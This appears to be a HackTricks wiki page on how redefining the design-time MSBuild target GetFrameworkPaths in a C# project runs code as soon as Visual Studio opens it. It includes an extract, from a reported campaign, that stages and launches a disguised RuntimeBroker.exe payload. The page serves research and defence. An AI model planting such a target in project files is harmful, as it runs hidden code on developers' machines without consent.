# Visual Studio Project Design-Time MSBuild Execution

{{#include ../banners/hacktricks-training.md}}

Opening a C# project in Visual Studio is not a passive read. Its design-time build invokes named MSBuild targets to initialize IntelliSense, references and debugging **before** the developer selects Build or Run. `GetFrameworkPaths` is one of those targets. A project that redefines it can turn project load into user-context code execution without a separate payload click.<sup>[[1]](#references)[[2]](#references)</sup>

The reported project declared resource files, then used `MakeDir`, `Copy` and `Exec` inside its replacement target to stage and launch a colocated payload. This reduced extract preserves the execution path shown in the source's Figure 6; it belongs inside a `.csproj`, not in a standalone XML file.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Import order matters:** MSBuild uses the *last* definition of a target. A target written in a project file is not guaranteed to replace the Microsoft target if a later import redefines it. SDK-style projects using `<Project Sdk="...">` implicitly import SDK targets after the project body, so inspect the evaluated import order rather than assuming this exact override works in every project. `MSBuild.exe -preprocess:expanded.xml project.csproj` expands imports without building the project and can help locate the effective target definition.<sup>[[3]](#references)[[4]](#references)</sup>

This is a developer-project execution surface, not a VSIX extension installation and not a privilege escalation by itself. If the staged executable uses a malicious adjacent `.exe.config` or DLL, continue with [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Blinder Tunnel Campaign Targets Iraqi Infrastructure](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio Integration (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild Targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild Command-Line Reference](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)

{{#include ../banners/hacktricks-training.md}}
